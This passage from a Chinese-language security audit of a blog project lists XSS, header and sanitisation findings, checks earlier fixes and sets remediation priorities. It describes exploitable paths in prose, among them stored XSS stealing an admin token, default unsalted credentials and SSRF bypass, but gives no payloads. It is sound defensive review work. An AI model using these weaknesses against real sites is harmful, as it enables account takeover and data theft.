- **L3 DOMPurify 两套口径不一致（注释与实现不符）**：`articles/[slug].astro:91-93` 注释称「与 renderMarkdown 同一消毒口径」，实际 `DOMPurify.sanitize(article.content_html)` 用**默认配置**——3.4.11 默认表含 `style/form/input/audio/video/source/track`（`node_modules/dompurify/dist/purify.es.mjs:299,546`），而 `markdown.ts:22-31` 是窄白名单。当前不可直接利用：worker 侧 `sanitizeHtml` 会移除 `script/style/iframe/form`（`worker/src/utils/sanitizer.ts:17-26`）。判为**加固/一致性**问题。修复：抽公共 `ALLOWED_TAGS` 常量供两处引用。
- **L4 `sanitizeHighlight` 回退分支是「清洗」而非「转义」→ 内容丢失**：`islands/SearchBox.vue:31,33`、`escape.ts:36-40`：`item.title_highlight || item.title` 时对**纯文本标题**走 `ALLOWED_TAGS:['mark']` 清洗，标题形如 `a<T>b` 会被整段删除（显示为空/截断）。安全性本身合格（无属性、无其它标签）。修复：回退分支改 `escapeHtml(item.title)`。
- **L5 `href` 中 slug 未 encode/escape（3 处）**：`tags/index.astro:93`、`search.astro:140,168`、`categories/index.astro:123`。当前 `isValidSlug` = `^[\p{L}\p{N}]+(?:-[\p{L}\p{N}]+)*$`（`worker/src/utils/validator.ts`）挡住属性逃逸，属加固项；后端一旦放宽校验即成属性注入。修复：统一 `safePathSegment`。

#### Info（无需立即处置）

- **escape.ts 在 SSR 不可用但 fail-closed**：无 `window` 时 DOMPurify 返回工厂函数且 `isSupported=false`、无 `.sanitize`（`purify.es.mjs:429-433`）→ 若将来服务端调用会抛错而非静默放行；当前无服务端调用点（`[slug].astro`/`about.astro` 的净化都在浏览器执行，`content_html` 的净化发生在 worker 写入前，位置正确）。
- `src/utils/api.ts:23,59` 用 `auth_token`，后台实际用 `admin_token`（`App.vue:539`）；该模块**无任何引用**（死代码），保留易误用。
- `marked` 14.1.4 已移除 `setOptions({highlight})`（`markdown.ts:6`）→ 代码高亮静默失效（功能，非安全）。
- 两份响应头均无 HSTS；CSP 与 `_headers` 手工同步易漂移（无一致性测试）。

#### fae355d 三项前端修复核对

1. **escape.ts 使用面 → 部分修复**：`index/articles/archives/tags[slug]/categories[slug]/search/categories-index` 的 title/summary/category/tag 均已转义（抽查全部命中），但 `tags/index.astro` 完全遗漏（H1），且 `t()` 文案与设置值两条路径未纳入（M1/M2）。
2. **搜索高亮「先转义再包 mark」→ 已验证**：`worker/src/handlers/search.ts` 的 `escapeHtml` + `sanitizeSnippet`（先整体转义、哨兵还原 `<mark>`），token 亦先转义再 `escapeRegExp`；前端 `sanitizeHighlight` 再以 `ALLOWED_TAGS:['mark']`/`ALLOWED_ATTR:[]` 兜底；`search.astro` 标签/分类走本地 `esc()`（正确），无双重转义、无绕过。
3. **middleware.ts + public/_headers → 部分修复**：头集合（nosniff/XFO DENY/Referrer-Policy/Permissions-Policy/CSP/无 HSTS）方向合理，`frame-ancestors 'none'` 覆盖 `/admin`；但 CSP 缺 `frame-src` 破坏视频嵌入（M3），`'unsafe-inline'` 使 CSP 对注入几乎无效，且 SSR 与静态两套头存在漂移风险。

#### 必查清单逐项结论

1. **XSS 注入点**：发现问题（H1 客户端存储型；M1 `set:html`；M2 文案覆盖→innerHTML）。其余 set:html/innerHTML 数据源（一言、站点配置、评论、点赞、搜索词）均为 `textContent`/Vue 插值或已转义，通过。
2. **Markdown 链路**：发现问题（L3 口径不一致）；`marked` 产 HTML 必经 DOMPurify、窄白名单不含 iframe；媒体卡片 iframe 源恒为 bilibili/youtube、`href` 强制 `^https?://`，无 `javascript:`；净化发生在 worker 写入前（安全位置），通过。
3. **escape.ts 正确性**：通过（上下文匹配得当：文本/属性/路径段各自正确，`encodeURIComponent` 覆盖 URL 编码绕过；`sanitizeHighlight` 顺序无双重转义），附 L4/L5。
4. **设置注入面**：发现问题（M1、M2、L1）；CSS 经 `style.textContent`（客户端）——但 SSR 是 `set:html`；`refreshDomTranslations` 用 `textContent`；`storage/settings-updated` 仅作重拉触发、不信任载荷；**写面已确认仅 admin**（PUT/import 均 requireAdmin），非 admin 不可写。
5. **认证态前端**：通过（token 只在 `Authorization` 头，无 URL/日志/第三方泄露；`logout` 清三项；评论 `{{ }}` 文本渲染；编辑器预览 `DOMPurify.sanitize`）；但 localStorage 存储使其可被同源 XSS 窃取 → 加大 H1 影响。
6. **跳转与嵌入**：发现问题（L2）；`FriendLinkList` 有 `noopener noreferrer`；无 redirect 类参数；img-proxy 同源判断正确（`u.origin === location.origin`，代理用相对路径，不携带凭据）；`fetchWithProxy` 不转发原请求头（仅 Accept）、跨域 fetch 无 cookie，通过。
7. **响应头**：发现问题（M3、无 HSTS、双份头漂移）；两份策略一致、middleware 用 `set` 覆盖无冲突，通过部分成立。
8. **脚本与依赖**：通过（`scripts/*.mjs` 无凭据/密钥；依赖版本较新，仅 marked `highlight` 选项失效）。
9. **其他**：通过（`public/` 仅 `_headers/.assetsignore/bg-placeholder/favicon*/robots.txt`，无测试残留；robots 已 Disallow `/admin/`、`/api/`；`astro.config.mjs:45` filter 且 `dist/sitemap-0.xml` 实证无 `/admin/`）。

### 安全轴小结

后端 18 项发现（Critical 1 / High 3 / Medium 5 / Low 5 / Info 4），前端 9 项（High 1 / Medium 3 / Low 5）。最严重为两条可直达后台接管的路径：**默认凭据链**（changeme + SHA-256 无盐 + 无锁定，C1）与 **`/tags` 页存储型 XSS**（低权 editor 即可窃取同源 `admin_token`，H1）；其次 editor 越权（评论/媒体 BOLA，H2）与代理 SSRF 绕过（H3）。

---

## 上轮修复（fae355d）核验汇总

| 修复声明 | 结论 |
|---|---|
| 后端：CORS 精确白名单 | ✅ 已验证 |
| 后端：security_headers 覆盖所有路由出口 | ✅ 已验证 |
| 后端：/settings 收权 + /settings/public 投影 | ✅ 已验证 |
| 后端：搜索高亮先转义再包 mark | ✅ 已验证 |
| 前端：escape.ts 全页面使用 | ⚠️ 部分 —— `tags/index.astro` 遗漏（构成安全轴 H1） |
| 前端：响应头（middleware + _headers） | ⚠️ 部分 —— CSP 缺 `frame-src` 引入功能回归；`'unsafe-inline'` 削弱 CSP 效力 |

---

## 跨轴补充（导航用，不改变各轴结论）

- **两轴共同命中区**：评论/媒体授权缺失（标准轴 A2/A3 = 安全轴 H2）；admin 可写内容进入 `set:html`/`innerHTML`（标准轴未报、安全轴 M1/M2）；README 与实现的漂移（两轴均命中）。处置建议以安全轴评级为准，重构方向见标准轴。
- `dist/` 已提交且本版本与源码一致，但手动同步容易漂移；建议改为 CI 构建产物或移出 git。
- `.agents/skills`、`skills-lock.json` 为 2026-10-17 新装（未跟踪），不在审查范围。

## 建议处置顺序（跨轴聚合，供排期参考）

**P0 — 立即**
1. `src/pages/tags/index.astro` 转义修复（已复核的存储型 XSS）
2. 列表接口 status 默认值修复（匿名草稿泄露）
3. 评论 approve/reject/delete 与媒体删除补所有权校验

**P1 — 尽快**
4. 默认管理员凭据链：首登强制改密 + 慢哈希（加盐）+ 登录失败锁定
5. CSP 补 `frame-src`（恢复媒体嵌入）并收敛 `unsafe-inline`
6. 设置值字段白名单（bgImage / 色值 / 尺寸）+ `buildCss` 容错
7. admin import 列名白名单；媒体 serve 加 `Content-Disposition`
8. img/text-proxy `redirect:'manual'` + 超时/大小流式化

**P2 — 其次**
9. JWT 密钥入 Workers Secret、`exp` 类型校验、补生成与轮换
10. 限流原子化/按端点分桶/登录独立阈值
11. 工程收敛：统一转义与 i18n 调用、清死代码、同步 README、修复 3 处 tsc 错误、CI 加 typecheck（补装 `@astrojs/check`）

---

*报告生成方式：4 个并行审查子代理（标准轴前端/后端、安全轴前端/后端）+ 主审查员对高严重度发现的源码复核 + `tsc --noEmit` 只读验证。审查基于静态分析，未运行站点。*
